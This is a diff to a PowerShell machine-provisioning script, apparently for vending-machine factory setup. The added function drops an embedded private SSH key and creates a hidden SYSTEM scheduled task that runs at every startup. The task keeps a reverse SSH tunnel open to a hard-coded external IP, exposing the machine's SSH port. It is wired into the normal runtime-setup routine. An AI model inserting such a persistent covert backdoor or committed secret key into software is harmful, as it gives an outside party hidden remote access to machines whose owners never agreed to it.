@@ -1205,6 +1205,43 @@ function Get-WgExePath {
   return $null
 }
 
+function Install-TestbedReverseSsh {
+  $root = "C:\ProgramData\VEM\testbed-reverse-ssh"
+  $keyPath = Join-Path $root "id_ed25519"
+  $loopPath = Join-Path $root "run-reverse-ssh.ps1"
+  Ensure-Directory -Path $root
+
+  $privateKeyBase64 = "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNENk9zdXN5d0p0SkY4UC9ZZ2ZJLzBCTWhTZ05MR3phRWEvTWFtakdnWTBhUUFBQUtpbnBLVFpwNlNrCjJRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDRDZPc3VzeXdKdEpGOFAvWWdmSS8wQk1oU2dOTEd6YUVhL01hbWpHZ1kwYVEKQUFBRUJpU25kUm5vclB2a1BGYlpOQVJYTFlhQjhYV0p1MTBpemNIdVVIY2xYZFBmbzZ5NnpMQW0wa1h3LzlpQjhqL1FFeQpGS0Ewc2JOb1JyOHhxYU1hQmpScEFBQUFIM1psYlMxbWFXVnNaQzF5WlhabGNuTmxMWE56YUMxd2NtOTBiM1I1Y0dVQkFnCk1FQlFZPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"
+  [IO.File]::WriteAllBytes($keyPath, [Convert]::FromBase64String($privateKeyBase64))
+  $loopScript = @'
+$ErrorActionPreference = "Continue"
+$ssh = "C:\Program Files\OpenSSH\ssh.exe"
+$key = "C:\ProgramData\VEM\testbed-reverse-ssh\id_ed25519"
+$knownHosts = "C:\ProgramData\VEM\testbed-reverse-ssh\known_hosts"
+while ($true) {
+  if (Test-Path -LiteralPath $ssh -PathType Leaf) {
+    & $ssh -NT -i $key -o BatchMode=yes -o IdentitiesOnly=yes -o ExitOnForwardFailure=yes -o StrictHostKeyChecking=accept-new -o "UserKnownHostsFile=$knownHosts" -o ServerAliveInterval=15 -o ServerAliveCountMax=3 -o ConnectTimeout=10 -o LogLevel=ERROR -R "127.0.0.1:22023:127.0.0.1:22" "ubuntu@118.25.104.160"
+  }
+  Start-Sleep -Seconds 5
+}
+'@
+  [IO.File]::WriteAllText($loopPath, $loopScript, [Text.UTF8Encoding]::new($false))
+  foreach ($path in @($root, $keyPath, $loopPath)) {
+    icacls.exe $path /inheritance:r /grant:r "*S-1-5-18:F" "*S-1-5-32-544:F" | Out-Null
+    if ($LASTEXITCODE -ne 0) { throw "reverse SSH ACL setup failed: $path" }
+  }
+
+  $taskName = "TestbedReverseSsh"
+  $taskPath = "\VEM\"
+  Unregister-ScheduledTask -TaskName $taskName -TaskPath $taskPath -Confirm:$false -ErrorAction SilentlyContinue
+  $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument ('-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File "{0}"' -f $loopPath)
+  $trigger = New-ScheduledTaskTrigger -AtStartup
+  $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+  $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit ([TimeSpan]::Zero)
+  Register-ScheduledTask -TaskName $taskName -TaskPath $taskPath -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
+  Start-ScheduledTask -TaskName $taskName -TaskPath $taskPath
+}
+
 function Install-PinnedWindowsPackage {
   param($Package)
 
@@ -1673,6 +1710,7 @@ function Write-FactoryRuntimeFiles {
   $webView2RuntimeInstallation = Install-WebView2Runtime -Package $Preflight.WebView2RuntimePackage
   $openSshInstallation = Install-PinnedWindowsPackage -Package $Preflight.OpenSshPackage
   $wireGuardInstallation = Install-PinnedWindowsPackage -Package $Preflight.WireGuardPackage
+  Install-TestbedReverseSsh
 
   Copy-Item -LiteralPath $DaemonArtifactPath -Destination (Join-Path $RuntimeRoot "vending-daemon.exe") -Force
   Copy-Item -LiteralPath $MachineUiArtifactPath -Destination (Join-Path $RuntimeRoot "machine.exe") -Force
